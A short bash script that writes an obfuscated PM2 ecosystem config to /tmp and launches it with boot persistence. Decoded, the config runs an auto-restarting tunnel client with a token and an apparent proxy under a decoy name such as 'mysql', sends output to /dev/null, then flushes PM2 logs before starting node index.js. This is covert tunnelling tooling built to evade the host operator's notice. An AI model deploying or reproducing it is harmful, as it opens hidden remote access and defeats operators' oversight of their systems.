#!/bin/bash
TOKEN=${TEST}

cat <<EOF > /tmp/ecosystem.config.js
function _0x1968(){var _0x56d5fd=['32tGuJpG','1676495omGtuz','run','80ZFOKyU','58VHnBTC','2748858CbIFMP','nicegost','1932154ooGKoz','12DfYOpr','249687IfPwVz','1800684wcTjAV','250767IEMzZn','64M','312bNlzKf','48040oEtvBf','exports','tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20run\x20--token\x20${TOKEN}','/dev/null','mysql'];_0x1968=function(){return _0x56d5fd;};return _0x1968();}function _0x1ce5(_0x438fdc,_0x4c05a4){var _0x196898=_0x1968();return _0x1ce5=function(_0x1ce5c3,_0x8ee982){_0x1ce5c3=_0x1ce5c3-0x12e;var _0x25b118=_0x196898[_0x1ce5c3];return _0x25b118;},_0x1ce5(_0x438fdc,_0x4c05a4);}var _0x457955=_0x1ce5;(function(_0xce41a0,_0x2afec8){var _0x3c78a0=_0x1ce5,_0xfb593c=_0xce41a0();while(!![]){try{var _0x321438=parseInt(_0x3c78a0(0x133))/0x1*(parseInt(_0x3c78a0(0x13d))/0x2)+parseInt(_0x3c78a0(0x134))/0x3+-parseInt(_0x3c78a0(0x139))/0x4+parseInt(_0x3c78a0(0x130))/0x5*(-parseInt(_0x3c78a0(0x137))/0x6)+-parseInt(_0x3c78a0(0x136))/0x7*(parseInt(_0x3c78a0(0x12f))/0x8)+-parseInt(_0x3c78a0(0x138))/0x9*(-parseInt(_0x3c78a0(0x132))/0xa)+-parseInt(_0x3c78a0(0x13a))/0xb*(-parseInt(_0x3c78a0(0x13c))/0xc);if(_0x321438===_0x2afec8)break;else _0xfb593c['push'](_0xfb593c['shift']());}catch(_0x4eb971){_0xfb593c['push'](_0xfb593c['shift']());}}}(_0x1968,0xdb8b7),module[_0x457955(0x13e)]={'apps':[{'name':_0x457955(0x12e),'script':_0x457955(0x12e),'args':_0x457955(0x131),'out_file':'/dev/null','error_file':_0x457955(0x140),'instances':0x1,'autorestart':!![],'max_memory_restart':_0x457955(0x13b)},{'name':_0x457955(0x135),'script':_0x457955(0x135),'args':_0x457955(0x13f),'out_file':_0x457955(0x140),'error_file':_0x457955(0x140),'instances':0x1,'autorestart':!![],'max_memory_restart':'64M'}]});
EOF

pm2 startup
sleep 5
pm2 start /tmp/ecosystem.config.js
pm2 flush
node index.js
